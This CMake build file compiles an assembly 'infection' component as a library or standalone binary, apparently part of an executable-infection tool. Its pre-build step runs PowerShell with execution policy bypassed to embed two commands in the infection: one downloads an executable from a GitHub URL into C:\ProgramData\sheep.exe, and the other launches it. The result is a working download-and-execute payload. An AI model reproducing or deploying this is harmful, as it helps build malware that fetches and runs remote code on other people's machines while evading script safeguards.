cmake_minimum_required(VERSION 3.15)

# set(CMAKE_ASM_NASM_OBJECT_FORMAT win32)
project(infection_asm_32 C ASM_NASM) # the C is to include the msvc linker
option(INFECTION_STANDALONE "Build the infection as a standalone binary" OFF)

if (INFECTION_STANDALONE)
  add_executable(infection_asm_32 main.asm)
else()
  add_library(infection_asm_32 STATIC main.asm)
endif()

add_custom_command(TARGET infection_asm_32
  PRE_BUILD
  COMMAND powershell ARGS
  -ExecutionPolicy bypass
  -File "${CMAKE_CURRENT_SOURCE_DIR}/../strings.ps1"
  -launch_command "C:\\ProgramData\\sheep.exe"
  -download_command "powershell -ExecutionPolicy bypass \
-Command \"(New-Object System.Net.WebClient).DownloadFile(\
'https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe', 'C:\\ProgramData\\sheep.exe')\""
  -output "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection_strings.asm"
  VERBATIM)

if (INFECTION_STANDALONE)
  target_link_options(infection_asm_32 PUBLIC "LINKER:/ENTRY:main")
  target_compile_definitions(infection_asm_32 PUBLIC
    INFECTION_STANDALONE)
else()
  target_compile_definitions(infection_asm_32 PUBLIC
    INFECTION_TLS)
endif()

target_include_directories(infection_asm_32 PUBLIC
  "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>")
